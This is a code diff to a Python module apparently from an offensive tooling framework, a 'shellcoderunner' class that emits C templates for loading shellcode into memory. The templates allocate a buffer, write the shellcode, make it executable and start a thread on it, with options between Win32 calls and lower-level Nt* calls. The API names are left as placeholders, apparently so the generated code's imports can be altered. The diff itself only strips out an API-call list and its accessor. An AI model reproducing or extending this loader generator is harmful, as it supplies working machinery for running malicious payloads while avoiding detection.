@@ -2,8 +2,6 @@ from string import Template
 
 class shellcoderunner:
     def __init__(self, arguments):
-        self.apicallsList = ['CloseHandle']
-
         self.memoryPermission = 'PAGE_EXECUTE_READ'
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
@@ -23,7 +21,6 @@ class shellcoderunner:
             self.freeCode = """
     {VirtualFree}(buffer, 0, MEM_RELEASE);
 """
-            self.apicallsList += ['VirtualAlloc', 'VirtualFree']
         elif self.allocation == 'HeapAlloc':
             self.allocationCode = """
     HANDLE hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
@@ -42,7 +39,6 @@ class shellcoderunner:
             self.freeCode = """
     {NtFreeVirtualMemory}((HANDLE)-1, &buffer, 0, MEM_RELEASE);
 """
-            self.apicallsList += ['NtAllocateVirtualMemory', 'NtFreeVirtualMemory']
 
         self.execution = 'CreateThread'
         if 'execution' in arguments:
@@ -55,13 +51,11 @@ class shellcoderunner:
             self.executionCode = """
     HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
 """
-            self.apicallsList += ['CreateThread']
         elif self.execution == 'NtCreateThreadEx':
             self.executionCode = """
     HANDLE hThread;
     {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)buffer, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
 """
-            self.apicallsList += ['NtCreateThreadEx']
 
         self.copy = 'memcpy'
         if 'copy' in arguments:
@@ -79,7 +73,6 @@ class shellcoderunner:
     SIZE_T bytesWritten = 0;
     {NtWriteVirtualMemory}((HANDLE)-1, buffer, shellcode, {shellcodeSize}, &bytesWritten);
 """
-            self.apicallsList += ['NtWriteVirtualMemory']
 
         self.protect = 'VirtualProtect'
         if 'protect' in arguments:
@@ -93,14 +86,12 @@ class shellcoderunner:
     DWORD oldProtect;
     {VirtualProtect}(buffer, {shellcodeSize}, $memoryPermission, &oldProtect);
 """).substitute(memoryPermission=self.memoryPermission)
-            self.apicallsList += ['VirtualProtect']
         elif self.protect == 'NtProtectVirtualMemory':
             self.protectCode = Template("""
     SIZE_T size = {shellcodeSize};
     ULONG OldProtect; 
     {NtProtectVirtualMemory}((HANDLE)-1, &buffer, &size, $memoryPermission, &OldProtect);
 """).substitute(memoryPermission=self.memoryPermission)
-            self.apicallsList += ['NtProtectVirtualMemory']
 
         self.wait = 'WaitForSingleObject'
         if 'wait' in arguments:
@@ -113,14 +104,12 @@ class shellcoderunner:
             self.waitCode = """
     {WaitForSingleObject}(hThread, INFINITE);
 """
-            self.apicallsList += ['WaitForSingleObject']
         elif self.wait == 'NtWaitForSingleObject':
             self.waitCode = """
     LARGE_INTEGER li = {{ 0 }};
     li.QuadPart = -1;
     {NtWaitForSingleObject}(hThread, FALSE, NULL);
 """
-            self.apicallsList += ['NtWaitForSingleObject']
 
         self.close = 'CloseHandle'
         if 'close' in arguments:
@@ -133,12 +122,10 @@ class shellcoderunner:
             self.closeCode = """
     {CloseHandle}(hThread);
 """
-            self.apicallsList += ['CloseHandle']
         elif self.close == 'NtClose':
             self.closeCode = """
     {NtClose}(hThread);
 """
-            self.apicallsList += ['NtClose']
 
 
     def imports(self) -> list[str]:
@@ -152,9 +139,6 @@ class shellcoderunner:
     
     def codeblocks(self) -> str:
         return ''
-
-    def apicalls(self) -> list[str]:
-        return self.apicallsList
 
     def template(self) -> str:
         return Template("""
